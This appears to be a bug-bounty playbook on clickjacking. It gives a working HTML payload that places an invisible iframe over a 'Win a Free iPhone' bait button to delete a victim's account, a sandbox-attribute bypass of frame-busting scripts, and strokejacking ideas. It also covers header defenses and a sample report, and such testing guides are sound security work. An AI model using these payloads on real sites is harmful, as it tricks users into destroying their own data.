# Clickjacking (UI Redressing)

## When to Use
- When a target application lacks the `X-Frame-Options` or `Content-Security-Policy: frame-ancestors` HTTP response headers.
- When you discover a state-changing action (e.g., a "Delete Account" button or "Transfer Funds" form) that does NOT require password re-authentication.
- To execute a client-side attack escalating a Missing Headers vulnerability into a high-impact action (Bug Bounty requirement).


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Detecting Framability

```http
# Concept: If an application allows itself to be embedded inside an <iframe> on a 
# completely different domain, it is vulnerable to UI redressing.

# 1. Check HTTP Response Headers of the target page
HTTP/1.1 200 OK
# Notice that these headers are MISSING:
# X-Frame-Options: DENY / SAMEORIGIN
# Content-Security-Policy: frame-ancestors 'none' / 'self'

# 2. Basic Test HTML
# Save this locally as test.html and open it in your browser.
<html>
    <body>
        <h1>Can I frame the target?</h1>
        <iframe src="https://target.com/settings" width="800" height="600"></iframe>
    </body>
</html>

# If target.com/settings successfully loads inside the iframe, Clickjacking is possible.
```

### Phase 2: Exploitation Payload Construction

```html
<!-- Concept: We must perfectly align our malicious "Click Here" button completely -->
<!-- ON TOP OF the victim's invisible "Delete Account" button inside the iframe. -->
<!-- We use CSS opacity and absolute positioning. -->

<!DOCTYPE html>
<html>
<head>
    <style>
        /* The invisible target iframe */
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 1000px;
            height: 800px;
            opacity: 0.0001; /* Set to 0.5 when testing, 0.0001 for real attack */
            z-index: 2; /* Iframe sits ON TOP of the bait button */
        }
        
        /* The visible bait the victim thinks they are clicking */
        .bait-button {
            position: absolute;
            /* YOU MUST ADJUST THESE TO PERFECTLY ALIGN WITH THE IFRAME'S TARGET BUTTON */
            top: 250px; 
            left: 100px; 
            z-index: 1; /* Bait sits UNDER the iframe */
            font-size: 20px;
            padding: 10px 20px;
            background-color: blue;
            color: white;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h1>Win a Free iPhone!</h1>
    <div class="bait-button">Click to Claim Prize!</div>
    
    <!-- The victim is authenticated on target.com, so the iframe loads their real profile -->
    <iframe src="https://target.com/account/settings/delete"></iframe>
</body>
</html>
```

### Phase 3: Advanced Clickjacking (Multi-Step / Form Filling)

```text
# Concept: What if the action requires the victim to type their email before clicking "Delete"?

# 1. Use Strokejacking (Keystroke Hijacking)
# The attacker places their own input field beneath the invisible iframe.
# The victim types into what they think is the attacker's "Claim Form", but the invisible iframe captures the keystrokes.

# 2. Multi-Step Clicks
# If an action requires checking a box and clicking a button, build a game (e.g., "Click the moving dot 3 times").
# Move the invisible iframe underneath the user's cursor dynamically using JavaScript so they click the exact necessary checkboxes.
```

### Phase 4: Bypassing Weak Defenses (Frame-Busting Scripts)

```html
<!-- Concept: Before X-Frame-Options, developers used JavaScript "frame-busting" -->
<!-- `if (top.location != self.location) { top.location = self.location; }` -->

<!-- Bypass: Use HTML5 iframe sandboxing to explicitly disable JavaScript execution inside the iframe. -->
<!-- Since the target requires the victim solely to click a button, the HTML button will still function, but the frame-busting script will crash. -->

<iframe sandbox="allow-forms" src="https://target.com/settings"></iframe>
```

## 🔵 Blue Team Detection & Defense
- **X-Frame-Options**: The legacy, but extraordinarily robust standard. Configure the web server to emit `X-Frame-Options: SAMEORIGIN` or `DENY` on all responses containing HTML.
- **Content-Security-Policy (CSP)**: The modern standard. `Content-Security-Policy: frame-ancestors 'self'` replaces X-Frame-Options and prevents any external domain from rendering the application within a frame.
- **State-Changing Verification**: Operations like changing an email or transferring funds should always prompt the user to re-enter their password (or rely on robust CSRF tokens scoped to the active visible session), significantly increasing the difficulty of single-click UI redressing.

## Key Concepts
| Concept | Description |
|---------|-------------|
| UI Redressing | The formal term for covering an application with an attacker's UI or tricking the user into interacting with hidden elements |
| X-Frame-Options | An HTTP response header specifically designed to declare whether a browser should be allowed to render a page in a `<frame>` or `<iframe>` |
| CSRF vs Clickjacking | CSRF relies on forging an HTTP request invisibly in the background. Clickjacking relies on the user making the legitimate HTTP request themselves via a hijacked physical mouse click |

## Output Format
```
Bug Bounty Report: Clickjacking leading to Account Deletion
===========================================================
Vulnerability: UI Redressing (Clickjacking)
Severity: Medium (CVSS 6.5)
Target: GET /settings/profile

Description:
The application's `/settings/profile` page lacks `X-Frame-Options` and `Content-Security-Policy: frame-ancestors` headers. Because the "Delete My Account" button located on this page requires only a single click and no password confirmation, an attacker can embed this page in a malicious iframe and execute a UI Redressing attack.

Reproduction Steps:
[Include attached Proof-of-Concept HTML file]
1. Retain an active, authenticated session on target.com.
2. Open the provided `clickjack_exploit.html` file in a totally separate domain.
3. The page displays a game titled "Click the Red Dot". 
4. Clicking the central red dot aligns perfectly with the invisible "Delete My Account" button in the overlaying iframe.
5. The account is instantly deleted.

Impact:
Unintentional, critical data destruction executed by authenticated users navigating to third-party domains.
